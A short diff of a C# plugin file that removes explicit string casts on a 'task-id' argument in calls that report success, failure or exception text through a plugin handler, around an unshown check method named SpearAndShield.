@@ -32,7 +32,7 @@ namespace Plugins
                 {
                     if (SpearAndShield(sword))
                     {
-                        PluginHandler.Write("Success", (string)args["task-id"], true);
+                        PluginHandler.Write("Success", args["task-id"], true);
                         return;
                     }
                 }
@@ -40,18 +40,18 @@ namespace Plugins
                 {
                     if (SpearAndShield(spear))
                     {
-                        PluginHandler.Write("Success", (string)args["task-id"], true);
+                        PluginHandler.Write("Success", args["task-id"], true);
                         return;
                     }
                 }
 
-                PluginHandler.Write("Failed", (string)args["task-id"], true, "error");
+                PluginHandler.Write("Failed", args["task-id"], true, "error");
                 return;
             }
             catch (Exception e)
             {
                 //oh no an error
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
             }
         }
         private bool SpearAndShield(byte[] shield)
